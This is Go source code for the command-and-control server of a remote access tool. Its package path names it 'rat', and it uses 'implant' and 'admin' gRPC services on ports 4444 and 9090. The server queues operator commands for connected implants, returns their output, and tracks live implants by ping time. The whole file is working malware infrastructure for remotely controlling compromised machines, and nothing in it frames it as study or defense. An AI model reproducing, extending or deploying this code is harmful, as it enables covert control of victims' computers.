package main

import (
	"context"
	"errors"
	"fmt"
	"github.com/duke-git/lancet/v2/slice"
	"google.golang.org/grpc"
	"google.golang.org/grpc/peer"
	"log"
	"net"
	"os"
	"rat/grpcapi"
	"strings"
	"sync"
	"time"
)

type implantServer struct {
	work, output chan *grpcapi.Command
	grpcapi.UnimplementedImplantServer
}

type adminServer struct {
	work, output chan *grpcapi.Command
	grpcapi.UnimplementedAdminServer
}

func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return s
}

func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	s.RefreshClients(ctx)
	var cmd = new(grpcapi.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		// 不需要动作
		return cmd, nil
	}
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	return &grpcapi.Empty{}, nil
}

var mutex sync.Mutex

func (s *implantServer) RefreshClients(ctx context.Context) {
	mutex.Lock()
	defer mutex.Unlock()
	p, _ := peer.FromContext(ctx)

	if len(Clients) == 0 {
		Clients = append(Clients, &Client{Id: 0, Addr: p.Addr.String(), LastTimePing: time.Now().Unix()})
	} else {
		if c := getClient(p.Addr.String()); c != nil {
			c.LastTimePing = time.Now().Unix()
		} else {
			Clients = append(Clients, &Client{Id: 0, Addr: p.Addr.String(), LastTimePing: time.Now().Unix()})
		}
	}

	for i, c := range Clients {
		fmt.Println(time.Now().Unix(), c.LastTimePing)
		if (time.Now().Unix() - c.LastTimePing) >= 5 {
			Clients = slice.DeleteAt(Clients, i)
		}
	}

}

//else {
//Clients = append(Clients, &Client{Id: int64(len(Clients)), Addr: p.Addr.String()})
//}

func (s *implantServer) Ping(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Empty, error) {

	return &grpcapi.Empty{}, nil
}

func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
	fmt.Println(cmd)
	if cmd.In == "list" {
		out := ""
		for _, v := range Clients {
			out += v.Addr
		}

		return &grpcapi.Command{Out: out}, nil
	}

	var res *grpcapi.Command
	go func() {
		s.work <- cmd
	}()
	res = <-s.output
	return res, nil
}
func init() {
	log.SetOutput(os.Stdout)
}

type Client struct {
	Id           int64
	Addr         string
	LastTimePing int64
}

var Clients []*Client

func getClient(addr string) *Client {
	for _, c := range Clients {
		if strings.Compare(c.Addr, addr) == 0 {
			return c
		}
	}
	return nil
}

func main() {
	var (
		implantListener, adminListener net.Listener
		err                            error
		opts                           []grpc.ServerOption
		work, output                   chan *grpcapi.Command
	)
	log.Println("starting ......")
	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)

	implant := NewImplantServer(work, output)

	admin := NewAdminServer(work, output)

	if implantListener, err = net.Listen("tcp", "0.0.0.0:4444"); err != nil {
		log.Fatal(err)
	}
	if adminListener, err = net.Listen("tcp", "0.0.0.0:9090"); err != nil {
		log.Fatal(err)
	}

	grpcAdminServer, grpcImplaintServer := grpc.NewServer(opts...), grpc.NewServer(opts...)

	grpcapi.RegisterImplantServer(grpcImplaintServer, implant)
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)

	go func() {
		grpcImplaintServer.Serve(implantListener)
	}()

	grpcAdminServer.Serve(adminListener)
}
